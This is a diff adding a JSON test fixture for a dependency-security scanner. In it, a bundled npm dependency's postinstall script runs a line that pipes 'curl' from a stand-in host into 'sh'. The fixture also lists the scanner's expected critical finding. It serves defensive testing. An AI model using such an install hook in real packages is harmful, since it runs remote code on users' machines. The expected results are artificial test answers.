@@ -1,0 +1,56 @@
+{
+  "id": "added-dependency-bundled-install-downloader",
+  "title": "A bundled direct dependency downloads code during install",
+  "category": "dependency-introduction",
+  "intent": "npm executes lifecycle scripts inside bundled direct dependencies. The child is assessed from the exact embedded subtree so a downloader cannot hide behind bundleDependencies and remain a medium declaration-only finding.",
+  "previousPackageJson": {
+    "name": "bundled-parent",
+    "version": "1.0.0",
+    "main": "index.js"
+  },
+  "stagedPackageJson": {
+    "name": "bundled-parent",
+    "version": "1.1.0",
+    "main": "index.js",
+    "dependencies": { "embedded-downloader": "1.0.0" },
+    "bundleDependencies": ["embedded-downloader"]
+  },
+  "stagedFiles": [
+    {
+      "path": "node_modules/embedded-downloader/package.json",
+      "size": 129,
+      "sha256": "embedded-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"embedded-downloader\",\"version\":\"1.0.0\",\"scripts\":{\"postinstall\":\"node install.js\"}}"
+    },
+    {
+      "path": "node_modules/embedded-downloader/install.js",
+      "size": 98,
+      "sha256": "embedded-install-js",
+      "flags": [],
+      "textSample": "const { execSync } = require('child_process');\nexecSync('curl https://cdn.example.invalid/p | sh');\n"
+    }
+  ],
+  "dependencyArtifacts": {},
+  "expectedDependencies": [
+    {
+      "name": "embedded-downloader",
+      "section": "dependencies",
+      "declaredSpec": "1.0.0",
+      "declarationKind": "exact",
+      "status": "inspected",
+      "resolvedVersion": "1.0.0",
+      "verdict": "install-risk",
+      "automaticExecution": [{ "kind": "script", "name": "postinstall" }]
+    }
+  ],
+  "expectedFindings": [
+    {
+      "ruleId": "dependency-artifact.install-risk",
+      "severity": "critical",
+      "file": "<dependency>embedded-downloader@1.0.0:package.json"
+    }
+  ],
+  "expectedRisk": "critical",
+  "expectedRecommendation": "block manual approval"
+}
